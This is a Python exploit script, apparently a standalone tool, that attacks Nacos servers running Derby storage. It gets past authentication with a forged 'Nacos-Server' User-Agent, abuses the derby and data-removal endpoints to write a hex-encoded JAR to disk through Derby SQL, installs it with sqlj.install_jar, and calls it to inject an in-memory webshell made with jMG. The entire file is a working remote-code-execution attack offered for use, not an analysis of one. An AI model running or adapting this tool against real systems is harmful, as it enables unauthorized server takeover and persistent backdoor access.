import os
import sys
import requests
from urllib.parse import urljoin
import random
import argparse


class NacosRCE:

    def __init__(self, target, token='', jarfilepath='', memshell_class=''):
        self.option = '1'
        self.removal_url = urljoin(target, '/nacos/v1/cs/ops/data/removal')
        self.derby_url = urljoin(target, '/nacos/v1/cs/ops/derby')
        self.console_state_url = urljoin(target, '/nacos/v1/console/server/state')
        self.access_token = token
        self.jarfilepath = jarfilepath
        self.memshell_class = memshell_class
        self.id = self.getRandomId()
        self.jar_hex = ''
        self.jar_name = f'{self.id}.jar'
        self.jar_filepath_remote = f'/tmp/tmp{self.jar_name}'
        self.headers = {
            "User-Agent": "Nacos-Server"
        }
        self.socks_proxy = 'http://127.0.0.1:8083'
        self.proxies = {
            "http": self.socks_proxy,  # SOCKS 代理
            "https": self.socks_proxy,  # SOCKS 代理
        }
        if self.access_token != '':
            self.headers['Accesstoken'] = self.access_token

    def getRandomId(self):
        return ''.join(random.sample('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', 8))

    def check_vul(self):
        derby_req = requests.get(url=self.derby_url, headers=self.headers)
        removal_req = requests.get(url=self.removal_url, headers=self.headers)
        if ("caused: Required" in derby_req.text and derby_req.status_code == 500) and (
                "caused: Request" in removal_req.text and removal_req.status_code == 500):
            return True
        else:
            return False

    def check_derby(self):
        req = requests.get(url=self.derby_url + "?sql=select%20*%20from%20users", headers=self.headers)
        if req.json().get("code") == 500 and "The current storage mode is not Derby" in req.json().get("message"):
            return False

    def get_console_info(self):
        req = requests.get(url=self.console_state_url)
        data_json = req.json()
        if req.status_code == 200:
            if 'startup_mode' not in data_json.keys():
                data_json['startup_mode'] = data_json.get("standalone_mode")
            if 'auth_enabled' not in data_json.keys():
                data_json['auth_enabled'] = "Unknown"
            return [data_json.get("version"), data_json.get("auth_enabled"), data_json["startup_mode"]]

    def base_info(self):
        data = self.get_console_info()
        print("[*] Nacos Version: " + data[0] + ", Authentication Required: " + data[1] + ", Startup Mode: " + data[2])

    def jar_to_hex(self):
        if not os.path.exists(self.jarfilepath):
            raise FileNotFoundError(f"指定的文件 {self.jarfilepath} 不存在。")

        try:
            with open(self.jarfilepath, 'rb') as jar_file:
                binary_data = jar_file.read()
                javahex = binary_data.hex()
                print(f"[*]convert Jar File {self.jarfilepath} to hex ")
        except Exception as e:
            print(f"读取 jar 文件时发生错误：{e}")
        return javahex

    def generate_insert_sql(self, option):
        self.option = option
        hex_length = len(self.jar_hex)
        # 根据 hex 长度和 derby 字节长度要求判断出需要切成几片，也就是需要执行几次INSERT INTO操作
        times = 0
        # Number of hex constant digits	16,336
        if hex_length % 512 > 0:
            times = int(hex_length // 512) + 1
        elif hex_length % 512 == 0:
            times = int(hex_length / 512)

        insert_sql = ''
        begin = 0
        end = 0
        insert_statements = []
        for i in range(times):
            begin = i * 512
            if i == 0:
                begin = 0
                end = 512
            elif i == times - 1:
                end = hex_length
            else:
                end = begin + 512
            str_hex = self.jar_hex[begin:end]
            insert_statements.append(f"INSERT INTO {self.id}_FILE_STORAGE (id, file_data, file_name) VALUES ({i + 1}, CAST(X'{str_hex}' AS BLOB), '{self.jar_name}')")
        insert_sql = '\n'.join(insert_statements)

        return insert_sql

    def javahex_exploit(self, option):
        insert_sql = self.generate_insert_sql(option)
        for i in range(0, sys.maxsize):
            if i >= 300:
                print("[-] The vulnerability failed to be exploited. Please try to exploit it manually")
                sys.exit(1)
            self.option = option
            self.external_name = self.getExternalName(self.option)
            post_sql = """CREATE TABLE {id}_FILE_STORAGE (id INTEGER PRIMARY KEY, file_data BLOB, file_name VARCHAR(255))
            {insert_sql}
            CALL SYSCS_UTIL.SYSCS_EXPORT_QUERY_LOBS_TO_EXTFILE('SELECT file_data FROM {id}_FILE_STORAGE WHERE file_name = ''{jarname}'' ORDER BY id','/tmp/{id}.del',',','\"','UTF-8','{jarpath}')
            CALL sqlj.install_jar('{jarpath}', 'NACOS.{id}', 0)
            CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath','NACOS.{id}')
            CREATE FUNCTION S_EXAMPLE_{id}(PARAM CHAR(32) FOR BIT DATA) RETURNS CHAR(32) FOR BIT DATA PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME '{method}'
            """.format(insert_sql=insert_sql,memshell_class=self.memshell_class,jarpath=self.jar_filepath_remote,id=self.id,jarname=self.jar_name,method=self.external_name)

            data = {'file': post_sql}
            req = requests.post(url=self.removal_url, files=data, headers=self.headers)
            try:
                data_json = req.json()
                if data_json.get('message', None) is None and data_json.get('data', None) is not None:
                    print("[+] Execution successful, Vulnerability exists! Function Name: S_EXAMPLE_" + self.id)
                    break
            except requests.exceptions.JSONDecodeError as e:
                pass

        self.inject_memshell()


    def inject_memshell(self):
        get_sql = """select * from (select count(*) as b, S_EXAMPLE_{id}(X'1F') as a from config_info) tmp /*ROWS FETCH NEXT*/""".format(
            id=self.id)
        req = requests.get(url=self.derby_url + "?sql=" + get_sql, headers=self.headers)
        data_json = req.json()
        if req.status_code == 200:
            print("[+] Execution result: " + data_json.get("message"))
        else:
            print("[-] Execution error!")

    def getExternalName(self, option):
        if option == '1':
            # 内存马注入器类名+public 方法名，jMG生成的内存马注入器类中可以调用的方法为gzipDecompress
            return self.memshell_class + ".gzipDecompress"

    def main(self):
        self.base_info()
        if self.check_vul() == False:
            print("[-] The interface does not allow unauthorized access or the Access Token is incorrect!")
            sys.exit(1)
        if self.check_derby() == False:
            print("[-] The current storage mode is not Derby and cannot be utilized in the future!")
            sys.exit(1)

        self.jar_hex = self.jar_to_hex()

        while True:
            option = input(
                "Please enter the number of the operation you wish to perform:\n1. Inject MemShell\n")
            self.javahex_exploit(option)
            break


if __name__ == '__main__':
    print("""
  _   _                       _____            _           
 | \ | |                     |  __ \          | |          
 |  \| | __ _  ___ ___  ___  | |  | | ___ _ __| |__  _   _ 
 | . ` |/ _` |/ __/ _ \/ __| | |  | |/ _ \ '__| '_ \| | | |
 | |\  | (_| | (_| (_) \__ \ | |__| |  __/ |  | |_) | |_| |
 |_| \_|\__,_|\___\___/|___/ |_____/ \___|_|  |_.__/ \__, |
                                                      __/ |
                                                     |___/ 
               
                                                Author: wileysec\n\n""")
    parser = argparse.ArgumentParser(
        description="Nacos Derby命令执行漏洞，默认使用User-Agent绕过漏洞请求执行命令，如有AccessToken请指定参数执行！只修改、保留了注入jMG生成的内存马的功能",
        add_help=True)
    parser.add_argument("-u", "--url", dest="nacos_url", required=True, help="对指定Nacos系统地址进行利用")
    parser.add_argument("-a", "--token", dest="access_token", required=False, help="指定Nacos的AccessToken")
    parser.add_argument("-f", "--jarfilepath", dest="jar_file_path", required=True, help="本地Java内存马文件绝对路径")
    parser.add_argument("-c", "--memclass", dest="memshell_class", required=True, help="jMG生成内存马的注入器类名【注意：不是内存马类名】")
    args = parser.parse_args()
    nacos = NacosRCE(args.nacos_url, args.access_token, args.jar_file_path, args.memshell_class)
    nacos.main()
